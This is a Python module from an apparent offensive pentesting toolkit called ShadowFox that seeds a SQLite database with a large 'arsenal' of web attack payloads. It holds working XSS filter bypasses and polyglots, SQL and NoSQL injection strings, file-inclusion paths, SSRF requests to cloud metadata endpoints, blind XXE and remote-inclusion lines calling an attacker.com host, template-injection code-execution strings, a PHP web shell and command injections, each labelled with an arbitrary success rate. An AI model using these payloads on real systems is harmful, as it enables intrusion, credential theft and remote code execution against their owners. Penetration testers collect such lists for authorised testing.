# shadowfox/core/payload_seeder.py

import sqlite3
import json
from typing import Dict, List
import base64
import urllib.parse

class PayloadLibrarySeeder:
    """
    Napredna biblioteka payload-a sa AI-optimizovanim setovima
    Ovo je arsenal ShadowFox-a - sve što treba za ozbiljan pentesting
    """
    
    def __init__(self, operator):
        self.operator = operator
    
    def seed_all_payloads(self):
        """Učitava sve payload-e u bazu"""
        payload_sets = {
            "XSS": self._get_xss_payloads(),
            "SQLi": self._get_sqli_payloads(),
            "LFI": self._get_lfi_payloads(),
            "RFI": self._get_rfi_payloads(),
            "SSRF": self._get_ssrf_payloads(),
            "XXE": self._get_xxe_payloads(),
            "SSTI": self._get_ssti_payloads(),
            "IDOR": self._get_idor_payloads(),
            "CSRF": self._get_csrf_payloads(),
            "JWT": self._get_jwt_payloads(),
            "CMD_INJECTION": self._get_cmd_injection_payloads(),
            "LDAP": self._get_ldap_payloads(),
            "NOSQL": self._get_nosql_payloads()
        }
        
        with sqlite3.connect(self.operator.shadowfox_db) as conn:
            # Očisti stare payload-e
            conn.execute("DELETE FROM payload_library")
            
            for payload_type, payloads in payload_sets.items():
                for payload_data in payloads:
                    conn.execute('''
                        INSERT INTO payload_library (payload_type, payload, description, success_rate)
                        VALUES (?, ?, ?, ?)
                    ''', (payload_type, payload_data["payload"], 
                          payload_data["description"], payload_data.get("success_rate", 0.5)))
        
        print(f"Učitano {sum(len(p) for p in payload_sets.values())} payload-a u biblioteku")
    
    def _get_xss_payloads(self) -> List[Dict]:
        """Advanced XSS payload set - bypasses, encodings, modern techniques"""
        return [
            # Basic vectors
            {"payload": "<script>alert('XSS')</script>", "description": "Basic script tag", "success_rate": 0.3},
            {"payload": "<img src=x onerror=alert('XSS')>", "description": "IMG onerror", "success_rate": 0.6},
            {"payload": "<svg onload=alert('XSS')>", "description": "SVG onload", "success_rate": 0.7},
            
            # WAF Bypasses
            {"payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "description": "Char code bypass", "success_rate": 0.8},
            {"payload": "<script>window['ale'+'rt']('XSS')</script>", "description": "String concatenation", "success_rate": 0.7},
            {"payload": "<ScRiPt>alert('XSS')</ScRiPt>", "description": "Case variation", "success_rate": 0.4},
            
            # Event handlers
            {"payload": "<input autofocus onfocus=alert('XSS')>", "description": "Autofocus technique", "success_rate": 0.6},
            {"payload": "<select onfocus=alert('XSS') autofocus>", "description": "Select autofocus", "success_rate": 0.6},
            {"payload": "<textarea autofocus onfocus=alert('XSS')>", "description": "Textarea autofocus", "success_rate": 0.6},
            
            # Modern bypasses
            {"payload": "<iframe srcdoc='&lt;script&gt;parent.alert(`XSS`)&lt;/script&gt;'></iframe>", "description": "Iframe srcdoc", "success_rate": 0.8},
            {"payload": "<object data='data:text/html,<script>alert(`XSS`)</script>'></object>", "description": "Object data URI", "success_rate": 0.7},
            {"payload": "<embed src='data:text/html,<script>alert(`XSS`)</script>'>", "description": "Embed data URI", "success_rate": 0.7},
            
            # Template literals
            {"payload": "<script>alert`XSS`</script>", "description": "Template literal", "success_rate": 0.5},
            {"payload": "<script>eval`alert\\`XSS\\``</script>", "description": "Eval template literal", "success_rate": 0.6},
            
            # DOM-based
            {"payload": "javascript:alert('XSS')", "description": "JavaScript protocol", "success_rate": 0.4},
            {"payload": "data:text/html,<script>alert('XSS')</script>", "description": "Data URI", "success_rate": 0.5},
            
            # Polyglot payloads
            {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e", "description": "Advanced polyglot", "success_rate": 0.9},
            
            # Filter bypasses
            {"payload": "<script>al\\u0065rt('XSS')</script>", "description": "Unicode escape", "success_rate": 0.7},
            {"payload": "<script>\\u0061lert('XSS')</script>", "description": "Unicode alert", "success_rate": 0.7},
            {"payload": "<script>window[atob('YWxlcnQ=')]('XSS')</script>", "description": "Base64 method", "success_rate": 0.8}
        ]
    
    def _get_sqli_payloads(self) -> List[Dict]:
        """Advanced SQL Injection payloads for all major databases"""
        return [
            # Basic injection
            {"payload": "' OR '1'='1", "description": "Basic OR injection", "success_rate": 0.4},
            {"payload": "' OR '1'='1' --", "description": "OR with comment", "success_rate": 0.5},
            {"payload": "' OR '1'='1' /*", "description": "OR with MySQL comment", "success_rate": 0.5},
            
            # Union-based
            {"payload": "' UNION SELECT NULL,NULL,NULL --", "description": "Union null select", "success_rate": 0.6},
            {"payload": "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --", "description": "Union number select", "success_rate": 0.6},
            {"payload": "' UNION SELECT user(),database(),version() --", "description": "Union info gathering", "success_rate": 0.7},
            
            # Boolean-based blind
            {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --", "description": "Boolean blind - tables", "success_rate": 0.8},
            {"payload": "' AND (SELECT LENGTH(database()))>0 --", "description": "Boolean blind - DB length", "success_rate": 0.8},
            {"payload": "' AND ASCII(SUBSTRING(database(),1,1))>64 --", "description": "Boolean blind - ASCII", "success_rate": 0.8},
            
            # Time-based blind
            {"payload": "'; WAITFOR DELAY '00:00:05' --", "description": "MSSQL time delay", "success_rate": 0.9},
            {"payload": "' AND SLEEP(5) --", "description": "MySQL sleep", "success_rate": 0.9},
            {"payload": "'; SELECT pg_sleep(5) --", "description": "PostgreSQL sleep", "success_rate": 0.9},
            {"payload": "' AND dbms_pipe.receive_message(('a'),5) IS NULL --", "description": "Oracle time delay", "success_rate": 0.9},
            
            # Error-based
            {"payload": "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) --", "description": "MySQL extractvalue error", "success_rate": 0.7},
            {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --", "description": "MySQL double query error", "success_rate": 0.7},
            
            # NoSQL injections
            {"payload": "[$ne]=1", "description": "MongoDB not equal", "success_rate": 0.6},
            {"payload": "[$regex]=.*", "description": "MongoDB regex", "success_rate": 0.6},
            {"payload": "[$where]=this.password.match(/.*/) //", "description": "MongoDB where clause", "success_rate": 0.7},
            
            # WAF bypasses
            {"payload": "' /*!50000OR*/ '1'='1", "description": "MySQL comment bypass", "success_rate": 0.8},
            {"payload": "' %55NION %53ELECT NULL --", "description": "URL encoding bypass", "success_rate": 0.7},
            {"payload": "' UnIoN SeLeCt NULL --", "description": "Case variation", "success_rate": 0.6},
            
            # Advanced techniques
            {"payload": "'; DECLARE @q varchar(99); SET @q = 0x73656c65637420404076657273696f6e; EXEC(@q) --", "description": "MSSQL hex encoding", "success_rate": 0.8},
            {"payload": "' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS int) --", "description": "Oracle cast error", "success_rate": 0.7}
        ]
    
    def _get_lfi_payloads(self) -> List[Dict]:
        """Local File Inclusion payloads"""
        return [
            # Basic LFI
            {"payload": "../../../etc/passwd", "description": "Basic passwd file", "success_rate": 0.6},
            {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "description": "Windows hosts file", "success_rate": 0.6},
            {"payload": "/etc/passwd", "description": "Direct passwd", "success_rate": 0.4},
            
            # Null byte (deprecated but sometimes works)
            {"payload": "../../../etc/passwd%00", "description": "Null byte bypass", "success_rate": 0.3},
            {"payload": "../../../etc/passwd%00.jpg", "description": "Null byte with extension", "success_rate": 0.3},
            
            # Double encoding
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "description": "Double URL encoding", "success_rate": 0.7},
            {"payload": "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd", "description": "UTF-8 encoding", "success_rate": 0.7},
            
            # Path variations
            {"payload": "....//....//....//etc/passwd", "description": "Double slash bypass", "success_rate": 0.6},
            {"payload": "..\\/..//..//..//etc/passwd", "description": "Mixed slashes", "success_rate": 0.6},
            
            # PHP wrappers
            {"payload": "php://filter/convert.base64-encode/resource=index.php", "description": "PHP filter base64", "success_rate": 0.8},
            {"payload": "php://input", "description": "PHP input stream", "success_rate": 0.7},
            {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "description": "Data URI phpinfo", "success_rate": 0.8},
            
            # Log poisoning targets
            {"payload": "/var/log/apache2/access.log", "description": "Apache access log", "success_rate": 0.5},
            {"payload": "/var/log/nginx/access.log", "description": "Nginx access log", "success_rate": 0.5},
            {"payload": "/proc/self/environ", "description": "Process environment", "success_rate": 0.6}
        ]
    
    def _get_ssrf_payloads(self) -> List[Dict]:
        """Server-Side Request Forgery payloads"""
        return [
            # Internal network
            {"payload": "http://127.0.0.1:80", "description": "Localhost HTTP", "success_rate": 0.7},
            {"payload": "http://localhost:22", "description": "Localhost SSH", "success_rate": 0.6},
            {"payload": "http://0.0.0.0:80", "description": "All interfaces", "success_rate": 0.6},
            
            # Cloud metadata
            {"payload": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata", "success_rate": 0.8},
            {"payload": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata", "success_rate": 0.8},
            {"payload": "http://169.254.169.254/metadata/instance", "description": "Azure metadata", "success_rate": 0.8},
            
            # Protocol bypasses
            {"payload": "file:///etc/passwd", "description": "File protocol", "success_rate": 0.6},
            {"payload": "gopher://127.0.0.1:25/", "description": "Gopher protocol", "success_rate": 0.7},
            {"payload": "dict://127.0.0.1:11211/", "description": "Dict protocol", "success_rate": 0.6},
            
            # Bypass techniques
            {"payload": "http://127.1:80", "description": "IP shorthand", "success_rate": 0.7},
            {"payload": "http://2130706433:80", "description": "IP as integer", "success_rate": 0.8},
            {"payload": "http://[::1]:80", "description": "IPv6 localhost", "success_rate": 0.7},
            
            # DNS rebinding
            {"payload": "http://localtest.me", "description": "DNS rebinding service", "success_rate": 0.6},
            {"payload": "http://customer1.app.localhost.my.company.127.0.0.1.nip.io", "description": "Wildcard DNS", "success_rate": 0.7}
        ]
    
    def _get_ssti_payloads(self) -> List[Dict]:
        """Server-Side Template Injection payloads"""
        return [
            # Jinja2/Flask
            {"payload": "{{7*7}}", "description": "Jinja2 basic math", "success_rate": 0.6},
            {"payload": "{{config}}", "description": "Flask config object", "success_rate": 0.7},
            {"payload": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "description": "Jinja2 RCE", "success_rate": 0.8},
            
            # Twig
            {"payload": "{{7*'7'}}", "description": "Twig string multiplication", "success_rate": 0.6},
            {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "description": "Twig RCE", "success_rate": 0.8},
            
            # Smarty
            {"payload": "{php}echo `id`;{/php}", "description": "Smarty PHP tags", "success_rate": 0.7},
            {"payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearConfig())}", "description": "Smarty file write", "success_rate": 0.8},
            
            # Freemarker
            {"payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "description": "Freemarker RCE", "success_rate": 0.8},
            
            # Velocity
            {"payload": "#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "description": "Velocity RCE", "success_rate": 0.8}
        ]
    
    def _get_jwt_payloads(self) -> List[Dict]:
        """JWT manipulation payloads"""
        return [
            # Algorithm confusion
            {"payload": "none", "description": "None algorithm bypass", "success_rate": 0.7},
            {"payload": "HS256_to_RS256", "description": "Algorithm confusion attack", "success_rate": 0.8},
            
            # Weak secrets
            {"payload": "secret", "description": "Common secret", "success_rate": 0.5},
            {"payload": "jwt", "description": "JWT as secret", "success_rate": 0.4},
            {"payload": "key", "description": "Key as secret", "success_rate": 0.4},
            
            # Claims manipulation
            {"payload": '{"alg":"HS256","typ":"JWT"}', "description": "Header manipulation", "success_rate": 0.6},
            {"payload": '{"admin":true}', "description": "Admin privilege escalation", "success_rate": 0.7},
            {"payload": '{"user":"admin"}', "description": "User impersonation", "success_rate": 0.7}
        ]
    
    def _get_cmd_injection_payloads(self) -> List[Dict]:
        """Command injection payloads"""
        return [
            # Basic injection
            {"payload": "; id", "description": "Semicolon separator", "success_rate": 0.6},
            {"payload": "| id", "description": "Pipe separator", "success_rate": 0.6},
            {"payload": "&& id", "description": "AND separator", "success_rate": 0.6},
            {"payload": "|| id", "description": "OR separator", "success_rate": 0.5},
            
            # Backticks
            {"payload": "`id`", "description": "Backtick execution", "success_rate": 0.7},
            {"payload": "$(id)", "description": "Dollar parentheses", "success_rate": 0.7},
            
            # Blind techniques
            {"payload": "; sleep 5", "description": "Sleep delay", "success_rate": 0.8},
            {"payload": "| ping -c 4 127.0.0.1", "description": "Ping delay", "success_rate": 0.7},
            
            # Windows
            {"payload": "& whoami", "description": "Windows AND", "success_rate": 0.6},
            {"payload": "| dir", "description": "Windows pipe dir", "success_rate": 0.6},
            
            # Encoded
            {"payload": ";%20id", "description": "URL encoded space", "success_rate": 0.7},
            {"payload": ";${IFS}id", "description": "IFS variable", "success_rate": 0.8}
        ]
    
    def _get_xxe_payloads(self) -> List[Dict]:
        """XXE payloads"""
        return [
            # Basic XXE
            {"payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', "description": "Basic file read", "success_rate": 0.7},
            
            # Blind XXE
            {"payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root></root>', "description": "Blind XXE", "success_rate": 0.8},
            
            # SSRF via XXE
            {"payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&test;</root>', "description": "XXE to SSRF", "success_rate": 0.8}
        ]
    
    def _get_rfi_payloads(self) -> List[Dict]:
        """Remote File Inclusion payloads"""
        return [
            {"payload": "http://attacker.com/shell.txt", "description": "Remote shell inclusion", "success_rate": 0.7},
            {"payload": "https://raw.githubusercontent.com/user/repo/main/shell.php", "description": "GitHub raw file", "success_rate": 0.6},
            {"payload": "data:text/plain,<?php system($_GET['cmd']); ?>", "description": "Data URI RFI", "success_rate": 0.8}
        ]
    
    def _get_idor_payloads(self) -> List[Dict]:
        """IDOR test payloads"""
        return [
            {"payload": "1", "description": "Simple increment", "success_rate": 0.5},
            {"payload": "admin", "description": "Admin user", "success_rate": 0.6},
            {"payload": "0", "description": "Zero ID", "success_rate": 0.4},
            {"payload": "-1", "description": "Negative ID", "success_rate": 0.5}
        ]
    
    def _get_csrf_payloads(self) -> List[Dict]:
        """CSRF payloads"""
        return [
            {"payload": '<form action="http://victim.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form><script>document.forms[0].submit()</script>', "description": "Auto-submit form", "success_rate": 0.7}
        ]
    
    def _get_ldap_payloads(self) -> List[Dict]:
        """LDAP injection payloads"""
        return [
            {"payload": "*", "description": "LDAP wildcard", "success_rate": 0.6},
            {"payload": "*)(uid=*))(|(uid=*", "description": "LDAP bypass", "success_rate": 0.7},
            {"payload": "*))%00", "description": "LDAP null byte", "success_rate": 0.5}
        ]
    
    def _get_nosql_payloads(self) -> List[Dict]:
        """NoSQL injection payloads"""
        return [
            {"payload": '{"$ne": null}', "description": "MongoDB not null", "success_rate": 0.6},
            {"payload": '{"$gt": ""}', "description": "MongoDB greater than", "success_rate": 0.6},
            {"payload": '{"$where": "this.password.match(/.*/)"}', "description": "MongoDB where regex", "success_rate": 0.7}
        ]

# Test i inicijalizacija
if __name__ == "__main__":
    from operator import ShadowFoxOperator
    
    op = ShadowFoxOperator()
    seeder = PayloadLibrarySeeder(op)
    seeder.seed_all_payloads()
    
    # Prikaži statistike
    with sqlite3.connect(op.shadowfox_db) as conn:
        cursor = conn.execute('''
            SELECT payload_type, COUNT(*) as count, AVG(success_rate) as avg_success
            FROM payload_library 
            GROUP BY payload_type
            ORDER BY count DESC
        ''')
        
        print("\n🎯 ShadowFox Payload Arsenal:")
        print("=" * 50)
        for row in cursor.fetchall():
            print(f"{row[0]:<15} | {row[1]:>3} payloads | {row[2]:.1%} avg success")
